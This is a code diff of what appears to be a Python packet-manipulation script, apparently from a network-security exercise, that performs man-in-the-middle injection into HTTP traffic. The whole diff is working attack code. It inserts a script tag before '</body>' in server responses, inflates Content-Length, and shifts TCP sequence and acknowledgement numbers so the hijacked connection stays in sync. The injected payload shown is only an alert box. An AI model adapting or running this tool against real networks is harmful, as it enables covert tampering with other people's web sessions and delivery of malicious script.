@@ -8,13 +8,19 @@ PROTO_TCP = 6
 PORT_WWW_HTTP = 80
 TCP_FIN = 0x01
 TCP_SYN = 0x02
+TCP_PSH = 0x08
 TCP_ACK = 0x10
+
+ENABLE = True
 
 SCRIPT = '<script>alert("PHP is the best language!");</script>'
 SCRIPT_LEN = len(SCRIPT)
 
 sessions = {}
 conf.L3socket = L3RawSocket
+
+def is_http_request(s):
+    return s[:3] == 'GET' and s.find('Accept: ') != -1
 
 def callback(pkt):
     modified = False
@@ -23,14 +29,15 @@ def callback(pkt):
         if data.proto == PROTO_TCP and data.sport == PORT_WWW_HTTP: # incoming
             # data.show()
             S = (data.dst, data.dport)
-            if S in sessions and data[TCP].flags == TCP_SYN | TCP_ACK:
-                sessions[S]['seq_'] = data[TCP].seq
-                sessions[S]['ack_'] = data[TCP].ack
-
             if S in sessions:
-                print(data.summary(), data.seq - sessions[S]['seq_'], data.ack - sessions[S]['ack_'])
+                if data[TCP].flags == TCP_SYN | TCP_ACK:
+                    sessions[S]['seq_'] = data[TCP].seq
+                    sessions[S]['ack_'] = data[TCP].ack
+
+                print(data.summary(), data.seq - sessions[S]['seq_'], data.ack - sessions[S]['ack_'], 'thres = ', sessions[S]['threshold'] - sessions[S]['seq_'])
                 if data[TCP].seq >= sessions[S]['threshold']:
-                    data[TCP].seq += sessions[S]['offset']
+                    if ENABLE:
+                        data[TCP].seq += sessions[S]['offset']
                     print(f'modify seq, delta = {sessions[S]["offset"]}, modified results = ({data[TCP].seq - sessions[S]["seq_"]}, {data[TCP].ack - sessions[S]["ack_"]})')
                     modified = True
 
@@ -38,17 +45,18 @@ def callback(pkt):
                 loc = raw.find('</body>')
                 if raw:
                     print('original data size', len(raw))
-                if loc != -1 and sessions[S]['modified_length']: # didn't consider the case where '</body>' itself is a string, e.g., "var x = '</body>';".
+                if loc != -1 and sessions[S]['monitored']: # didn't consider the case where '</body>' itself is a string, e.g., "var x = '</body>';".
 
                     # find the enclosing </body>
                     # should insert script before </body>
                     raw = raw[:loc] + SCRIPT + raw[loc:]
                     # raw = ' ' * len(raw)
                     sessions[S]['offset'] = SCRIPT_LEN
-                    sessions[S]['threshold'] = data[TCP].seq + len(data[TCP].payload) + sessions[S]['offset']
+                    sessions[S]['threshold'] = data[TCP].seq + sessions[S]['offset']
 
                     print('forging fake packet')
-                    data[TCP].payload = bytes(raw, 'utf-8')
+                    if ENABLE:
+                        data[TCP].payload = bytes(raw, 'utf-8')
                     modified = True
 
                     # forge a fake packet
@@ -68,25 +76,27 @@ def callback(pkt):
                     while end < len(raw) and raw[end].isdigit():
                         end += 1
                     length = str(int(raw[start:end]) + SCRIPT_LEN)
-                    data[TCP].payload = bytes(raw[:start] + length + raw[end:], 'utf-8')
+                    if ENABLE:
+                        data[TCP].payload = bytes(raw[:start] + length + raw[end:], 'utf-8')
                     modified = True
-                    sessions[S]['modified_length'] = True
 
-            if data[TCP].flags & TCP_FIN and S in sessions:
-                sessions[S]['FIN_count'] += 1
-                # if sessions[S]['FIN_count'] >= 2:
-                #    del sessions[S]
+                if data[TCP].flags & TCP_FIN:
+                    sessions[S]['FIN_count'] += 1
+                    # if sessions[S]['FIN_count'] >= 2:
+                    #    del sessions[S]
 
         elif data.proto == PROTO_TCP and data.dport == PORT_WWW_HTTP: # outgoing, client -> server
-            # data.show()
             S = (data.src, data.sport)
+            if data[TCP].flags == TCP_SYN:
+                sessions[S] = {'offset': 0, 'FIN_count': 0, 'threshold': 10**10, 'seq_': 0, 'ack_': 0, 'monitored': False}
             if S in sessions:
                 print(data.summary(), data.seq - sessions[S]['ack_'], data.ack - sessions[S]['seq_'])
-            if data[TCP].flags == TCP_SYN:
-                sessions[S] = {'offset': 0, 'FIN_count': 0, 'threshold': 10**10, 'seq_': 0, 'ack_': 0, 'modified_length': False}
+            if data[TCP].flags == TCP_ACK | TCP_PSH and is_http_request(bytes(data[TCP].payload).decode('utf-8')):
+                sessions[S]['monitored'] = True
             if S in sessions:
-                if data[TCP].ack >= sessions[S]['threshold']:
-                    data[TCP].ack -= sessions[S]['offset']
+                if data[TCP].ack >= sessions[S]['threshold'] + len(data[TCP].payload):
+                    if ENABLE:
+                        data[TCP].ack -= sessions[S]['offset']
                     print(f'modify ack, delta = {-sessions[S]["offset"]}, modified results = ({data[TCP].seq- sessions[S]["ack_"]}, {data[TCP].ack - sessions[S]["seq_"]})')
                     modified = True
             
